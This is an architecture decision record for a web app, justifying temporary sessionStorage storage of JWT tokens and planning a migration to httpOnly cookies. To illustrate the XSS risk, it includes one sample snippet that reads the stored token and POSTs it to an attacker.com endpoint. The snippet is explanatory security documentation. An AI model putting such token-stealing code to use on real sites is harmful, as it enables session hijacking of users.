# ADR-003: sessionStorage for Authentication (Temporary Solution)

**Date**: November 12, 2025
**Status**: Accepted (Temporary - Migration Planned)
**Decision Makers**: Frontend development team
**Superseded by**: ADR-004 (Migration to httpOnly Cookies) - Planned for v1.8.0

## Context and Problem

We need to store JWT tokens on the client to maintain user sessions. Requirements:

- Persistence while the user is using the application
- Accessible from JavaScript to include in `Authorization` headers
- Protection against common attacks (XSS, CSRF)
- Smooth user experience (no constant re-login)

## Options Considered

1. **localStorage**: Persists indefinitely, shared between tabs
2. **sessionStorage**: Persists only during the session, isolated per tab
3. **httpOnly Cookies**: Managed by the browser, not accessible from JS
4. **Memory only (useState)**: Disappears on page refresh

## Decision

**We temporarily adopt sessionStorage** to store JWT tokens:

```javascript
// src/utils/secureAuth.js
const TOKEN_KEY = 'auth_token';

export const setAuthToken = (token) => {
  sessionStorage.setItem(TOKEN_KEY, token);
};

export const getAuthToken = () => {
  return sessionStorage.getItem(TOKEN_KEY);
};
```

**This is a temporary solution. Migration plan to httpOnly cookies in v1.8.0**

## Rationale

### Why sessionStorage (vs localStorage):

| Aspect | sessionStorage | localStorage |
|--------|---------------|--------------|
| **Persistence** | Tab session only | Indefinite |
| **Shared between tabs** | No (isolated) | Yes |
| **Auto-cleanup** | Yes (close tab) | No |
| **XSS Vulnerability** | High | High |
| **Reduced lifetime** | Yes | No |

**sessionStorage is slightly more secure** because:
1. **Auto-cleanup**: Token disappears when closing tab
2. **Isolation**: A compromised tab does not affect others
3. **Short lifetime**: Reduces attack window

### Why NOT httpOnly Cookies (now):

**Requires backend changes:**
- FastAPI must send cookies instead of JSON response
- Auth middleware must read cookies instead of headers
- CORS configuration with `credentials: 'include'`

**Plan**: Migrate to httpOnly cookies in v1.8.0 (coordinated frontend + backend)

## Consequences

### Positive:
- ✅ **Quick implementation**: No backend changes
- ✅ **Auto-cleanup**: Token is deleted when closing tab
- ✅ **Isolation**: Not shared between tabs
- ✅ **Compatible**: With current backend authentication

### Negative (Vulnerabilities):
- ❌ **Vulnerable to XSS**: JavaScript can steal the token
- ❌ **No CSRF protection**: Token accessible from JavaScript
- ❌ **Requires manual header**: `Authorization: Bearer ${token}`
- ❌ **Does not persist**: User must re-login when closing tab

### XSS Vulnerability Example:
```javascript
// If an attacker injects this code:
const token = sessionStorage.getItem('auth_token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

**Current Mitigations:**
1. **Content Security Policy (CSP)** in index.html
2. **React Auto-Escaping**: Prevents XSS in JSX
3. **Input Validation**: Sanitization in forms
4. **No dangerouslySetInnerHTML**: Avoided throughout the app

**Planned Mitigation (v1.8.0):**
- Migration to httpOnly cookies (eliminates access from JavaScript)

## Validation

Temporary success criteria:
- [x] Functional authentication (✅ Login/Register/Logout)
- [x] Token included in API requests (✅ Authorization Headers)
- [x] Auto-cleanup when closing tab (✅ native sessionStorage)
- [ ] Migration to httpOnly cookies (Planned v1.8.0)

## Migration Plan (v1.8.0)

### Backend Changes Required:
```python
# FastAPI - Set httpOnly cookie
@app.post("/api/v1/auth/login")
async def login(response: Response):
    token = create_access_token(user.id)
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True,  # ✅ Not accessible from JavaScript
        secure=True,    # ✅ HTTPS only
        samesite="lax", # ✅ CSRF protection
        max_age=3600
    )
    return {"user": user_dto}  # Do NOT send token in body
```

### Frontend Changes Required:
```javascript
// Remove setAuthToken/getAuthToken
// Use fetch with credentials: 'include'
fetch(url, {
  credentials: 'include',  // Sends cookies automatically
  headers: {
    'Content-Type': 'application/json'
    // Do NOT include Authorization header
  }
})
```

## References

- [OWASP: JWT Storage Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Security: localStorage vs sessionStorage vs Cookies](https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage)
- [SECURITY_MIGRATION.md](../../SECURITY_MIGRATION.md) - Complete migration guide
- Backend ADR (future): Migration to httpOnly Cookies

## Implementation Notes

### Implemented (v1.0.0 - v1.7.0):
- ✅ `src/utils/secureAuth.js` with sessionStorage helpers
- ✅ Automatic migration from localStorage (legacy users)
- ✅ Token expiration validation (JWT decode)
- ✅ Cleanup on logout

### Files Affected in Future Migration:
- `src/utils/secureAuth.js` - Remove setAuthToken/getAuthToken
- `src/infrastructure/*/Api*Repository.js` - Add `credentials: 'include'`
- `src/pages/Login.jsx` - Do not save token manually
- `src/pages/Register.jsx` - Do not save token manually

## Related

- ADR-004: Migration to httpOnly Cookies (planned v1.8.0)
- ADR-005: Sentry for Error Tracking
- ROADMAP.md - Section "Security - CRITICAL Priority"
